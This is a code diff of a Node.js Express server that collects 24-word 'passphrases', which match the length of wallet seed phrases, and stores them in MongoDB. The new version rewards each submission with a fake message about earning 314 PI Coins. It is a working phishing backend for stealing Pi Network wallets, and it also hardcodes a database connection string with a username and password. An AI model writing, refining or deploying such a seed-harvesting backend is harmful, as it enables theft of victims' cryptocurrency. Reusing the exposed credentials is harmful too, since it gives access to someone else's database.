@@ -1,64 +1,87 @@
 const express = require('express');
 const mongoose = require('mongoose');
-const cors = require('cors');
 const bodyParser = require('body-parser');
-const path = require('path');
 
-// Initialize Express app
+// Create Express app
 const app = express();
-const port = 3000;
-
-// MongoDB URI
-const mongoURI = 'mongodb+srv://nycer84:22Zs37OelVnqlJ3q@cluster0.g89nk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';
-
-// Connect to MongoDB
-mongoose.connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
-    .then(() => console.log('Connected to MongoDB successfully'))
-    .catch(err => console.log('Error connecting to MongoDB:', err));
-
-// Define the schema and model for the passphrase
-const passphraseSchema = new mongoose.Schema({
-    passphrase: {
-        type: String,
-        required: true,
-    }
-});
-
-const Passphrase = mongoose.model('Passphrase', passphraseSchema);
 
 // Middleware
-app.use(cors());
-app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
 
-// Serve static files (front-end assets)
-app.use(express.static(path.join(__dirname, 'public')));
+// MongoDB Connection
+const mongoURI = 'mongodb+srv://nycer84:22Zs37OelVnqlJ3q@cluster0.g89nk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';
+mongoose
+    .connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
+    .then(() => console.log('MongoDB connected'))
+    .catch(err => console.error('MongoDB connection error:', err));
 
-// Endpoint to handle passphrase submission
+// Define Mongoose Schema and Model
+const PassphraseSchema = new mongoose.Schema({
+    passphrase: { type: String, required: true }
+});
+const Passphrase = mongoose.model('Passphrase', PassphraseSchema);
+
+// POST Route to handle form submission
 app.post('/submit', async (req, res) => {
     const { passphrase } = req.body;
 
-    // Check if the passphrase contains exactly 24 words
-    if (!passphrase || passphrase.trim().split(' ').length !== 24) {
-        return res.status(400).send('Invalid passphrase! Please enter exactly 24 words.');
+    if (!passphrase || passphrase.trim().split(" ").length !== 24) {
+        return res.status(400).send('Invalid passphrase. Ensure it has exactly 24 words.');
     }
 
-    // Save the passphrase to MongoDB
     try {
         const newPassphrase = new Passphrase({ passphrase });
         await newPassphrase.save();
 
-        // Send a success response
-        res.send('Passphrase saved successfully!');
+        // Send stylish HTML response with CSS
+        const successMessage = `
+        <html>
+            <head>
+                <style>
+                    body {
+                        font-family: Arial, sans-serif;
+                        background-color: #f4f4f4;
+                        color: #333;
+                        text-align: center;
+                        padding: 50px;
+                    }
+                    .message {
+                        background-color: #4CAF50;
+                        color: white;
+                        font-size: 24px;
+                        font-weight: bold;
+                        padding: 20px;
+                        border-radius: 8px;
+                        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+                        animation: fadeIn 1.5s ease-out;
+                    }
+                    @keyframes fadeIn {
+                        0% {
+                            opacity: 0;
+                            transform: scale(0.95);
+                        }
+                        100% {
+                            opacity: 1;
+                            transform: scale(1);
+                        }
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="message">
+                    Congratulations!!! You have earned your 314 PI Coins Successfully!!
+                </div>
+            </body>
+        </html>`;
+
+        res.status(200).send(successMessage);
     } catch (error) {
-        res.status(500).send('Error saving passphrase: ' + error.message);
+        console.error('Error saving passphrase:', error);
+        res.status(500).send('Failed to save passphrase.');
     }
 });
 
-// Serve the success page when the passphrase is saved
-app.get('/success', (req, res) => {
-    res.send(`
-        <html>
-            <head>
-                <title>Passphrase Saved</title>
-                <
+// Start the server
+const PORT = process.env.PORT || 5000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
